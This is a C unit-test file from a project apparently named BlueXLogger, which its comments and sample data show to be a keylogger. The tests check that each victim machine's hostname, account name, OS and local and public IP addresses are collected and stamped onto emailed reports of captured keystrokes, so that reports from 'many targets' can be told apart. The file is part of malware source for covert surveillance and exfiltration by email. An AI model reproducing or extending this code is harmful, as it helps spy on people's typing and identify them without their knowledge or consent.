/*============================================================================
 * BlueXLogger - tests/test_identity.c
 * The machine-identity block stamped onto every delivery.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * These cases exist because the identity is what makes a report from one of
 * many targets identifiable. A silently empty hostname would produce reports
 * that all look alike - the exact failure the identity was added to prevent -
 * so "never empty, always labelled" is asserted directly.
 *==========================================================================*/
#include "tests.h"
#include "bxl_identity.h"
#include "bxl_mime.h"
#include "bxl_util.h"

/*----------------------------------------------------------------------------
 * Collection
 *--------------------------------------------------------------------------*/
static void t_collect(void)
{
    BxlIdentity id;

    t_begin("init fills every field without touching the network");
    memset(&id, 0xAA, sizeof(id));
    bxl_identity_init(&id);

    t_begin("the machine name is present, never empty");
    T_OK(id.hostname[0] != 0);

    t_begin("the account name is present, never empty");
    T_OK(id.username[0] != 0);

    t_begin("the OS string is present, never empty");
    T_OK(id.os[0] != 0);

    t_begin("the local address is present, never empty");
    T_OK(id.local_ip[0] != 0);

    t_begin("the public address starts unresolved");
    T_STR(id.public_ip, "unknown");
    T_INT(id.public_attempted, 0);

    t_begin("the fields fit their documented capacities");
    T_OK(strlen(id.hostname)  < BXL_ID_HOSTNAME);
    T_OK(strlen(id.username)  < BXL_ID_USERNAME);
    T_OK(strlen(id.local_ip)  < BXL_ID_ADDR);
    T_OK(strlen(id.public_ip) < BXL_ID_ADDR);
    T_OK(strlen(id.os)        < BXL_ID_OS);

    t_begin("a NULL identity is ignored rather than dereferenced");
    bxl_identity_init(NULL);
}

/*----------------------------------------------------------------------------
 * Rendering
 *--------------------------------------------------------------------------*/
static void t_render(void)
{
    BxlIdentity id;
    char        buf[1024];

    memset(&id, 0, sizeof(id));
    bxl_str_copy(id.hostname,  sizeof(id.hostname),  "boobies");
    bxl_str_copy(id.username,  sizeof(id.username),  "alice");
    bxl_str_copy(id.local_ip,  sizeof(id.local_ip),  "192.168.1.5");
    bxl_str_copy(id.public_ip, sizeof(id.public_ip), "81.2.3.4");
    bxl_str_copy(id.os,        sizeof(id.os),        "Windows 11 10.0.22631");

    t_begin("the one-line form carries every labelled field");
    T_OK(bxl_identity_line(&id, buf, sizeof(buf)));
    T_STR(buf, "HOST=boobies USER=alice IP=192.168.1.5/81.2.3.4 "
               "OS=Windows 11 10.0.22631");

    t_begin("the multi-line block labels each field on its own line");
    T_OK(bxl_identity_block(&id, buf, sizeof(buf)));
    T_OK(strstr(buf, "Machine  : boobies") != NULL);
    T_OK(strstr(buf, "Account  : alice") != NULL);
    T_OK(strstr(buf, "Local IP : 192.168.1.5") != NULL);
    T_OK(strstr(buf, "Public IP: 81.2.3.4") != NULL);
    T_OK(strstr(buf, "System   : Windows 11 10.0.22631") != NULL);

    t_begin("the short form is host/account");
    T_OK(bxl_identity_short(&id, buf, sizeof(buf)));
    T_STR(buf, "boobies/alice");

    t_begin("a NULL identity is refused by every renderer");
    T_OK(!bxl_identity_line(NULL, buf, sizeof(buf)));
    T_OK(!bxl_identity_block(NULL, buf, sizeof(buf)));
    T_OK(!bxl_identity_short(NULL, buf, sizeof(buf)));

    t_begin("a NULL output buffer is refused");
    T_OK(!bxl_identity_line(&id, NULL, 0));
    T_OK(!bxl_identity_block(&id, NULL, 0));
    T_OK(!bxl_identity_short(&id, NULL, 0));

    t_begin("the renderers empty the buffer before failing");
    bxl_str_copy(buf, sizeof(buf), "sentinel");
    T_OK(!bxl_identity_line(NULL, buf, sizeof(buf)));
    T_STR(buf, "");
}

/*----------------------------------------------------------------------------
 * The identity survives the MIME report builders
 *--------------------------------------------------------------------------*/
static void t_reaches_report(void)
{
    BxlIdentity id;
    char        subj[256];
    char        body[2048];

    memset(&id, 0, sizeof(id));
    bxl_str_copy(id.hostname,  sizeof(id.hostname),  "boobies");
    bxl_str_copy(id.username,  sizeof(id.username),  "alice");
    bxl_str_copy(id.local_ip,  sizeof(id.local_ip),  "192.168.1.5");
    bxl_str_copy(id.public_ip, sizeof(id.public_ip), "81.2.3.4");
    bxl_str_copy(id.os,        sizeof(id.os),        "Windows 11 10.0.22631");

    t_begin("the subject distinguishes the machine and the account");
    T_OK(bxl_mime_make_subject(subj, sizeof(subj), "BlueXLogger report",
                               &id, 1757771527ULL));
    T_OK(strstr(subj, "boobies/alice") != NULL);

    t_begin("the plain-text body carries the identity block");
    T_OK(bxl_mime_make_body(body, sizeof(body), &id, 1757771527ULL,
                            "hello world<ENTER>", 18, 0));
    T_OK(strstr(body, "boobies") != NULL);
    T_OK(strstr(body, "alice") != NULL);
    T_OK(strstr(body, "81.2.3.4") != NULL);

    t_begin("a NULL identity degrades to 'unknown', not to an empty field");
    T_OK(bxl_mime_make_subject(subj, sizeof(subj), "BlueXLogger report",
                               NULL, 1757771527ULL));
    T_OK(strstr(subj, "unknown/unknown") != NULL);

    t_begin("the HTML alternative escapes the identity as one unit");
    {
        BxlIdentity evil;
        char        html[4096];
        memset(&evil, 0, sizeof(evil));
        bxl_str_copy(evil.hostname, sizeof(evil.hostname), "<script>x</script>");
        bxl_str_copy(evil.username, sizeof(evil.username), "a&b");
        bxl_str_copy(evil.local_ip, sizeof(evil.local_ip), "10.0.0.1");
        bxl_str_copy(evil.public_ip, sizeof(evil.public_ip), "unknown");
        bxl_str_copy(evil.os, sizeof(evil.os), "Windows");

        T_OK(bxl_mime_make_body_html(html, sizeof(html), &evil, 1757771527ULL,
                                     "log", 3, 0));
        T_OK(strstr(html, "<script>") == NULL);
        T_OK(strstr(html, "&lt;script&gt;") != NULL);
        T_OK(strstr(html, "a&amp;b") != NULL);
    }
}

void test_identity(void)
{
    t_suite("identity");
    t_collect();
    t_render();
    t_reaches_report();
}
